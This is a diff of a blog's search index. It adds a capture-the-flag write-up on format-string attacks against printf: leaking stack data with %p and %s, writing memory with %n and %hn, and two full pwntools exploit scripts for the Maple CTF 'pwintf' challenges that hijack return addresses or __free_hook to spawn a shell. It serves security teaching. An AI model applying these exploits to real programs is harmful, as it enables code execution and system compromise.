+<h2 id="verification"><a href="#verification" class="headerlink" title="verification"></a>verification</h2><p>Lets check with a debugger. </p>
+<p>First before call <code>printf</code>, the stack looks like this, we can see our <code>x</code> is at rsp, and <code>buf</code> is locate right under rsp.<br><img src="/2022/02/02/how-to-utilize-printf-in-pwn/2022-02-02_205224.jpg" alt="2022-02-02_205224.jpg"></p>
+<p>Lets enter <code>%p%p%p%p%p %p-%s</code>.</p>
+<ul>
+<li>The first 5 <code>%p</code> is used for the rest of 5 registers</li>
+<li>than <code>x</code> and <code>buf</code> is printed by by format <code>%p</code> and <code>%s</code></li>
+</ul>
+<p>We got exactly what we want<br><img src="/2022/02/02/how-to-utilize-printf-in-pwn/2022-02-02_205732.jpg" alt="2022-02-02_205732.jpg"></p>
+<p>we can also use <code>%p%p%p%p%p %p-%p</code> to print out the address of <code>buf</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You Enter:</span><br><span class="line">0x56206ad2e2a0(nil)0x7fdee909b1e70xc(nil) 0x1337-0x562069b06004</span><br></pre></td></tr></table></figure>
+
+<h2 id="simpler-method"><a href="#simpler-method" class="headerlink" title="simpler method"></a>simpler method</h2><p>using <code>%p%p%p%p%p %p-%p</code> is ok when we have large input size. But what happen if we don’t have enough input size.</p>
+<p>We can use <code>%num$format</code> to get the same result.</p>
+<p>for example, we want to get the <code>x</code> and <code>buf</code>. We know from previous, we can get x from 6th parameter and buf from 7th parameter.</p>
+<p>so, we can use <code>%6$p-%7$s</code> as a substitution. And we got the same result as <code>%p%p%p%p%p %p-%s</code></p>
+<p><img src="/2022/02/02/how-to-utilize-printf-in-pwn/2022-02-02_225614.jpg" alt="2022-02-02_225614.jpg"></p>
+<h1 id="0x3-Write-on-the-stack"><a href="#0x3-Write-on-the-stack" class="headerlink" title="0x3 Write on the stack"></a>0x3 Write on the stack</h1><h2 id="basic-idea-1"><a href="#basic-idea-1" class="headerlink" title="basic idea"></a>basic idea</h2><p>in order to write data by printf, We need use the <strong>debug features</strong> of printf - <code>%n</code>, <code>%hn</code>, and <code>%hhn</code>.</p>
+<p>basicly, <code>%n</code> allow you write <strong>total number of character printed</strong> into a int pointer.</p>
+<p>For example, following code will change x to 5 after printf.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int x = 0;</span><br><span class="line">  printf(&quot;before, x = %d\n&quot;,x); // here x = 0</span><br><span class="line">  printf(&quot;12345%n\n&quot;,&amp;x);</span><br><span class="line">  printf(&quot;after, x = %d\n&quot;,x); // this will print x = 5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>lets modify the example in the read. In this example, we need to find a way changing x to 0x1337.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char *buf = &quot;my super secret&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int *x = malloc(sizeof(int));</span><br><span class="line">  *x = 0x1336;</span><br><span class="line">  char s[0x20];</span><br><span class="line">  while (1)</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;hello here is my number 0x%x\n&quot;, *x);</span><br><span class="line">    puts(&quot;please enter: &quot;);</span><br><span class="line">    fgets(s, 0x20, stdin);</span><br><span class="line">    puts(&quot;You Enter: &quot;);</span><br><span class="line">    printf(s);</span><br><span class="line">    if (*x == 0x1337)&#123;</span><br><span class="line">      puts(buf);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Looking at this code, we can use again <code>printf(s)</code> to change value store in the *x.</p>
+<p>Since x is locate under the rsp if we check the debugger, we can use <code>%7$n</code> format string to point to the x.</p>
+<p><img src="/2022/02/02/how-to-utilize-printf-in-pwn/2022-02-02_230122.jpg" alt="2022-02-02_230122.jpg"></p>
+<p>then we use <code>%4919x%7$n</code> to write 0x1337 (4919) into x. (<code>%4919x</code> means pad 4919 byte, which has 4919 length)</p>
+<p>we can see the value of x has been successfully changed.</p>
+<p><img src="/2022/02/02/how-to-utilize-printf-in-pwn/2022-02-02_230645.jpg" alt="2022-02-02_230645.jpg"></p>
+<h2 id="n-hn-hhn"><a href="#n-hn-hhn" class="headerlink" title="%n? %hn? %hhn"></a>%n? %hn? %hhn</h2><p>we know that the different between them is how many bytes it write. </p>
+<p>Normally, we only use <code>%hn</code> and <code>%hhn</code>. </p>
+<p>Because four bytes like 0x11ffff = 1179647 is too <strong>large</strong> for stdout to write.</p>
+<p>if we take the example above and change some value</p>
+<ul>
+<li>if x = 0xffffffff, use <code>%1x%7$hn</code>, x will become 0xffff0001 (two bytes have been overwrited)</li>
+<li>if x = 0xffffffff, use <code>%1x%7$hhn</code>, x will become 0xffffff01 (one bytes have been overwrited)</li>
+</ul>
+<p><strong>What if I wants to write more than 2 bytes</strong></p>
+<p>For example, if we want to write 4 bytes (0x1011) at address 0x1002</p>
+<ul>
+<li>first write lower two bytes 0x11 at 0x1002</li>
+<li>second write higher two bytes 0x10 at 0x1004</li>
+<li>depending on the endianness, if computer use big endianness, this should be write at 0x1000</li>
+</ul>
+<h1 id="0x4-Example-baby-pwintf"><a href="#0x4-Example-baby-pwintf" class="headerlink" title="0x4 Example baby-pwintf"></a>0x4 Example baby-pwintf</h1><p>Lets take look at source code <a href="baby-pwintf.c">baby-pwintf.c</a></p>
+<p>the vulnerability is quite obvious if you read through the whole article.</p>
+<p>We just need change rating to 0x1337.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void vuln() &#123;</span><br><span class="line">    char* input = malloc(16);</span><br><span class="line">    int* rating = malloc(4);</span><br><span class="line"></span><br><span class="line">    fgets(input, 16, stdin);</span><br><span class="line">    *rating = input[0] % 11;</span><br><span class="line"></span><br><span class="line">    puts(&quot;Your name is:&quot;);</span><br><span class="line">    printf(input);</span><br><span class="line"></span><br><span class="line">    printf(&quot;I rate your name %d / 10\n&quot;, *rating);</span><br><span class="line"></span><br><span class="line">    if (*rating == 0x1337) &#123;</span><br><span class="line">        puts(&quot;Nice name! here&#x27;s a flag:&quot;);</span><br><span class="line">        win();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>part of exp.py</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line"># 0x1337 = 4919</span><br><span class="line">io.sendlineafter(b&quot;Tell me your name and I&#x27;ll rate it!&quot;, b&quot;%4919x%7$n&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{youwe_weady_fow_the_big_boy_chawwenge}</p>
+<h1 id="0x4-Example-pwintf"><a href="#0x4-Example-pwintf" class="headerlink" title="0x4 Example pwintf"></a>0x4 Example pwintf</h1><p>Now, we understand the basic of printf. Lets do some challenge</p>
+<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Full RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="Quick-look"><a href="#Quick-look" class="headerlink" title="Quick look"></a>Quick look</h2><p>lets take a quick look at the source code. There is a trivial vulnerability here - <code>printf(input)</code>.</p>
+<p>Before exploit the binary, there still some problem we need to find solution</p>
+<ol>
+<li>Since the input is locate at heap. We can’t write arbitrary data into the stack. </li>
+<li>the program didn’t provide a way to exist the while loop. And there is no ret instruction in the vuln function</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln() &#123;</span><br><span class="line">    puts(&quot;Wewcome b-back?!! Peopwe wewe t-twying t-to hack my pwogwam, so I stopped putting the x3 fwag in memowy ÚwÚ&quot;);</span><br><span class="line">    while(1) &#123;</span><br><span class="line">        char* input = malloc(0x100);</span><br><span class="line"></span><br><span class="line">        fgets(input, 0x100, stdin);</span><br><span class="line"></span><br><span class="line">        printf(input);</span><br><span class="line"></span><br><span class="line">        free(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    alarm(60);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>So, want can we do. There are two solution (maybe there is more but I only know two)</p>
+<ol>
+<li>change the rip of printf and then construct a rop chain to call one gadget</li>
+<li>write rop chain to free_hook</li>
+</ol>
+<h2 id="change-rip-of-printf-unintended"><a href="#change-rip-of-printf-unintended" class="headerlink" title="change rip of printf (unintended)"></a>change rip of printf (unintended)</h2><p>if we look at the stack before call program call printf. We can see that the address of printf rip is just 8 bytes above the vuln stack. </p>
+<p><img src="/2022/02/02/how-to-utilize-printf-in-pwn/2022-02-03_170338.jpg" alt="2022-02-03_170338.jpg"></p>
+<p>So, if we can find a way to overwrite this rip, we can use this rip to construct a rop chain.</p>
+<p>Lets summarize the idea of this method</p>
+<ol>
+<li>first, find a memory block in the stack, make that block point to the rip of printf</li>
+<li>use printf with %n, change the address of rip</li>
+<li>when printf finish. It will fall into the rop chain and spawn a shell.</li>
+</ol>
+<p>With these step in mind, After looking at the stack, I came up with a solution.</p>
+<p><em>because i’m lazy, so i choose the address on the stack so that I only need to write at most 4 bytes</em></p>
+<ol>
+<li>change the value of (rsp+35*0x8) to (rsp + 5*0x8) using (rsp + 7*0x8)</li>
+<li>change the value of (rsp+5*0x8) to one gadget address using (rsp+35*0x8)</li>
+<li>change the value of (rsp+35*0x8) to (rsp - 0x8) using (rsp + 7*0x8)</li>
+<li>change the value of (rsp - 0x8) to rop chain gadget address using (rsp+35*0x8)</li>
+<li>use pop_rbp_r12_r13_r14_r15_ret as the the rop chain gadget, pop all unnecessary value on the stack and return to one gadget address in (rsp+5*0x8)</li>
+</ol>
+<h3 id="exploit-py"><a href="#exploit-py" class="headerlink" title="exploit.py"></a>exploit.py</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;pwintf&quot;</span><br><span class="line">    libc = &quot;libc.so.6&quot;</span><br><span class="line">    # libc = &quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;&quot;</span><br><span class="line">    port = 32011</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Full RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wait_for_debugger(io):</span><br><span class="line">    if args.LOCAL and input(&quot;debugger?&quot;) == &quot;y\n&quot;:</span><br><span class="line">        pid = util.proc.pidof(io)[0]</span><br><span class="line">        log_print(&quot;The pid is: &quot; + str(pid))</span><br><span class="line">        util.proc.wait_for_debugger(pid)</span><br><span class="line">        log_print(&quot;press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line"># ======== gadget stuff =========</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== libc stuff =========</span><br><span class="line">libc_bin_sh_offset = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">log_print(&quot;libc /bin/sh offset&quot;, hex(libc_bin_sh_offset))</span><br><span class="line">libc_printf_offset = libc.sym[&quot;printf&quot;]</span><br><span class="line">log_print(&quot;libc printf offset&quot;, hex(libc_printf_offset))</span><br><span class="line">libc_system_offset = libc.sym[&quot;system&quot;]</span><br><span class="line">log_print(&quot;libc system offset&quot;, hex(libc_system_offset))</span><br><span class="line">libc_start_main_ret_offset = libc.libc_start_main_return</span><br><span class="line">log_print(&quot;libc_start_main_ret_offset&quot;, hex(libc_start_main_ret_offset))</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">lp = log_print</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line">def read_stack_at(offset):</span><br><span class="line">    io.sendline(b&quot;%%%d$p&quot;%(offset+6))</span><br><span class="line">    a = io.recvuntil(b&quot;0x&quot;)</span><br><span class="line">    return int(io.recv()[:-1:],16) &amp; 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">def read_data_at(offset):</span><br><span class="line">    io.sendline(b&quot;%%%d$x&quot;%(offset+6))</span><br><span class="line">    a = io.recvuntil(b&quot;0x&quot;)</span><br><span class="line">    return int(io.recv()[:-1:],16) &amp; 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">def write_stack_at(offset,data,number_of_bytes):</span><br><span class="line">    byte_format = b&quot;n&quot;</span><br><span class="line">    if number_of_bytes == 2:</span><br><span class="line">        byte_format = b&#x27;hn&#x27;</span><br><span class="line">    if number_of_bytes == 1:</span><br><span class="line">        byte_format = b&#x27;hhn&#x27;</span><br><span class="line">    io.sendline(b&quot;%%%dx%%%d$%s|IENDL&quot;%(data,offset+6,byte_format))</span><br><span class="line">    io.recvuntil(b&#x27;IENDL&#x27;)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">soffset_to_stack_35 = 7</span><br><span class="line">soffset_stack_35 = 35</span><br><span class="line">soffset_stack_vuln_rip = 3</span><br><span class="line">soffset_libc_start_main_ret = 5</span><br><span class="line"></span><br><span class="line"># lp(&quot;free hook addr&quot;,hex(libc.sym[&quot;__free_hook&quot;]))</span><br><span class="line"></span><br><span class="line">lp(io.recv())</span><br><span class="line"></span><br><span class="line">current_rsp_addr = read_stack_at(0) - 0x20</span><br><span class="line">lp(&quot;current rsp addr&quot;, hex(current_rsp_addr))</span><br><span class="line"># address of mov eax,0 at sym.main</span><br><span class="line">program_base_addr = read_stack_at(soffset_stack_vuln_rip) - (exe.sym[&quot;main&quot;] + 0x44)</span><br><span class="line">lp(&quot;program base addr&quot;, hex(program_base_addr))</span><br><span class="line">libc_base_addr = read_stack_at(soffset_libc_start_main_ret) - libc_start_main_ret_offset</span><br><span class="line">lp(&quot;libc base addr&quot;, hex(libc_base_addr))</span><br><span class="line">lp(&quot;/bin/sh&quot;, hex(libc_base_addr+libc_bin_sh_offset))</span><br><span class="line">pop_3_stack_ret_addr = program_base_addr + 0x131f</span><br><span class="line">pop_rbp_r12_r13_r14_r15_ret_addr = program_base_addr + 0x131b</span><br><span class="line">lp(&quot;pop_3_stack_ret_addr&quot;, hex(pop_3_stack_ret_addr))</span><br><span class="line">lp(&quot;pop_rbp_r12_r13_r14_r15_ret_addr&quot;, hex(pop_rbp_r12_r13_r14_r15_ret_addr))</span><br><span class="line"></span><br><span class="line">printf_rip_addr = current_rsp_addr - 0x8</span><br><span class="line">lp(&quot;printf rip addr&quot;, hex(printf_rip_addr))</span><br><span class="line"></span><br><span class="line"># one gadget r15,rdx == null</span><br><span class="line">one_gadget_addr = libc_base_addr + 0xe6c81</span><br><span class="line">lp(&quot;one gadget addr&quot;,hex(one_gadget_addr))</span><br><span class="line"></span><br><span class="line">stack_libc_start_main_ret_addr = current_rsp_addr + soffset_libc_start_main_ret * 0x8</span><br><span class="line">write_stack_at(soffset_to_stack_35,(stack_libc_start_main_ret_addr) &amp; 0xffff,2)</span><br><span class="line">write_stack_at(soffset_stack_35, one_gadget_addr &amp; 0xffff,2)</span><br><span class="line">write_stack_at(soffset_to_stack_35,(stack_libc_start_main_ret_addr+0x2) &amp; 0xffff,2)</span><br><span class="line">write_stack_at(soffset_stack_35, (one_gadget_addr &gt;&gt; 16) &amp; 0xffff,2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_stack_at(soffset_to_stack_35, printf_rip_addr &amp; 0xffff,2)</span><br><span class="line"># read_stack_at(soffset_stack_35)</span><br><span class="line">write_stack_at(soffset_stack_35, pop_rbp_r12_r13_r14_r15_ret_addr &amp; 0xffff,2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="write-rop-to-chain-to-free-hook-intended-solution"><a href="#write-rop-to-chain-to-free-hook-intended-solution" class="headerlink" title="write rop to chain to free_hook (intended solution)"></a>write rop to chain to free_hook (intended solution)</h2><p>after discuss with the author of the challenge. The intended solution for this one is actually using another debug feature - <strong>free_hook</strong></p>
+<p>So basically, libc have an writable function address called <code>__free_hook</code>. the function will be called every time <code>free()</code> is called. </p>
+<p>Therefore, by write address into <code>__free_hook</code>, we can escape from while loop and get into a rop chain</p>
+<h3 id="exploit-py-1"><a href="#exploit-py-1" class="headerlink" title="exploit.py"></a>exploit.py</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template --host localhost --port 1442 pwintf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;pwintf&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;localhost&#x27;</span><br><span class="line">port = int(args.PORT or 1442)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Full RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">io.sendline(b&quot;%11$p\n%6$p\n%13$p&quot;)</span><br><span class="line"></span><br><span class="line">libc.address = int(io.recvuntil(b&quot;\n&quot;, drop=True), 0) - libc.libc_start_main_return</span><br><span class="line">stack_addr_0 = int(io.recvuntil(b&quot;\n&quot;, drop=True), 0) - 0x20</span><br><span class="line">stack_addr_1 = int(io.recvuntil(b&quot;\n&quot;, drop=True), 0)</span><br><span class="line"></span><br><span class="line">stack_offset = 6 + (stack_addr_1 - stack_addr_0) // 8</span><br><span class="line"></span><br><span class="line">io.info(&quot;Libc: &quot; + hex(libc.address))</span><br><span class="line">io.info(&quot;Stack 0: &quot; + hex(stack_addr_0))</span><br><span class="line">io.info(&quot;Stack 1: &quot; + hex(stack_addr_1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_on_stack(value, offset):</span><br><span class="line">    for i in range(4):</span><br><span class="line">        io.sendline(&quot;%&#123;&#125;c%13$hn&quot;.format((stack_addr_0 + 8 * (offset - 6) + 2 * i) % 0x10000).encode())</span><br><span class="line">        io.recvline(1)</span><br><span class="line"></span><br><span class="line">        chars = (value // (0x10000 ** i)) % 0x10000</span><br><span class="line">        if chars == 0:</span><br><span class="line">            io.sendline(&quot;%&#123;&#125;$hn&quot;.format(stack_offset).encode())</span><br><span class="line">        else:</span><br><span class="line">            io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;.format(chars, stack_offset).encode())</span><br><span class="line">        io.recvline(1)</span><br><span class="line"></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;], 8)</span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;] + 2, 9)</span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;] + 4, 10)</span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;] + 6, 11)</span><br><span class="line"></span><br><span class="line">target = libc.sym[&#x27;system&#x27;]</span><br><span class="line">payload = &quot;/bin/bash #&quot;</span><br><span class="line">written = len(payload)</span><br><span class="line"></span><br><span class="line">chars = ((target % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%8$hn&quot;</span><br><span class="line"></span><br><span class="line">chars = (((target // 0x10000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%9$hn&quot;</span><br><span class="line"></span><br><span class="line">chars = (((target // 0x100000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%10$hn&quot;</span><br><span class="line"></span><br><span class="line">chars = (((target // 0x1000000000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%11$hn&quot;</span><br><span class="line"></span><br><span class="line">io.sendline(payload.encode())</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>maple{h0p3_1t_d1dnt_t4k3_l0ng}</p>
+]]></content>
+      <tags>
+        <tag>writeup</tag>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[writeup] Maple CTF 2022</title>
     <url>/2022/01/28/maple-ctf-2022-write-up/</url>
     <content><![CDATA[<h1 id="0x0-Introudction"><a href="#0x0-Introudction" class="headerlink" title="0x0 Introudction"></a>0x0 Introudction</h1><p>Maple CTF, which is first CTF event hold by Maple Bacon Team. Because it is the first CTF MapleBacon organzie a CTF event. This event is only open for current university students.</p>
@@ -2466,8 +2606,8 @@ https://www.bsfdvbsbilibili.com
 <li><a href="#wetuwn-to-wibc">wetuwn to wibc</a></li>
 <li><a href="#uwu-intewpwetew">uwu intewpwetew</a></li>
 <li><a href="/2022/01/30/maplectf2022-pwn-bruteforcing-canary/">birbs</a></li>
-<li>baby pwintf</li>
-<li>pwintf</li>
+<li><a href="/2022/02/02/how-to-utilize-printf-in-pwn/">baby pwintf</a></li>
+<li><a href="/2022/02/02/how-to-utilize-printf-in-pwn/">pwintf</a></li>
 </ul>
 <h1 id="0x2-Reverse"><a href="#0x2-Reverse" class="headerlink" title="0x2 Reverse"></a>0x2 Reverse</h1><p>I didn’t do much question in reverse because I’m too lazy to look at disassemble code, i just do some pretty straight forward question</p>
 <h2 id="plain"><a href="#plain" class="headerlink" title="plain"></a>plain</h2><p>the challenge provide an binary called <code>plain</code></p>
@@ -2659,9 +2799,9 @@ https://www.bsfdvbsbilibili.com
 <p><strong>flag</strong>: maple{nyo_wespect_fow_boundawies}</p>
 ]]></content>
       <tags>
-        <tag>web</tag>
         <tag>writeup</tag>
         <tag>ctf</tag>
+        <tag>web</tag>
         <tag>pwn</tag>
         <tag>crypto</tag>
         <tag>misc</tag>
